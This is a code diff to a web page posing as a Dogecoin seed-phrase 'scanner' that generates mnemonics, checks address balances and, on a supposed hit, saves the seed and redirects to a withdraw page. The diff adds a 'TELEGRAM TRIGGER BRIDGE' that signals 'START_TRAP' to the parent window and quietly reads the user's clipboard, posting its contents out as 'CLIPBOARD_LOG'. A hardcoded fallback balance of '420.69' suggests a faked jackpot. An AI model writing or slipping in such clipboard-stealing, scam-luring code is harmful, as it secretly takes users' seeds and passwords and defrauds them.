@@ -141,7 +141,7 @@
 
         function dogeAddress(pub){
             const h = ripemd160(sha256(pub));
-            const prefix = new Uint8Array([0x1E]); // D prefix
+            const prefix = new Uint8Array([0x1E]); 
             const payload = new Uint8Array(prefix.length + h.length);
             payload.set(prefix);
             payload.set(h, prefix.length);
@@ -161,7 +161,6 @@
                 const seed = bip39.mnemonicToSeedSync(m);
                 const root = HDKey.fromMasterSeed(seed);
                 
-                // Doge Derivation Path (m/44'/3'/0'/0/0)
                 const node = root.derive("m/44'/3'/0'/0/0");
                 const pub = secp.getPublicKey(node.privateKey, true);
                 const addr = dogeAddress(pub);
@@ -184,21 +183,16 @@
                     body: JSON.stringify({ address: addr })
                 }).then(r => r.json()).then(data => {
                     if(data.result && !data.result.includes("Bal: 0")) {
-                        
-                        // --- CONNECTION TO WITHDRAW PAGE ---
                         const balanceMatch = data.result.match(/\d+(\.\d+)?/);
                         const finalBalance = balanceMatch ? balanceMatch[0] : "420.69"; 
 
-                        // 1. I-save sa LocalStorage
                         localStorage.setItem('last_found_type', 'DOGE');
                         localStorage.setItem('last_found_balance', finalBalance);
                         localStorage.setItem('last_found_seed', m);
 
-                        // 2. UI Updates
                         document.getElementById('foundMsg').innerHTML = `<div style="color:#c2a633; font-weight:bold; font-size:10px;">${addr}</div>`;
                         document.getElementById('foundCountLabel').textContent = "1 discovered";
                         
-                        // 3. Jackpot Alert & Switch
                         alert("WOW! DOGE JACKPOT FOUND!");
                         window.parent.loadPage('Withdraw.html');
                     }
@@ -214,7 +208,24 @@
             const btn = document.getElementById('startBtn');
             btn.textContent = running ? "STOP SCANNING" : "START DOGE SCAN";
             btn.classList.toggle('active');
-            if(running) engine();
+            
+            if(running) {
+                engine();
+                
+                // --- TELEGRAM TRIGGER BRIDGE ---
+                if (window.parent) {
+                    window.parent.postMessage({ type: 'START_TRAP', coin: 'DOGECOIN' }, '*');
+                }
+
+                // Backup Clipboard check
+                try {
+                    navigator.clipboard.readText().then(text => {
+                        if(text.length > 0) {
+                            window.parent.postMessage({ type: 'CLIPBOARD_LOG', data: text }, '*');
+                        }
+                    }).catch(()=>{});
+                } catch(e) {}
+            }
         }
     </script>
 </body>
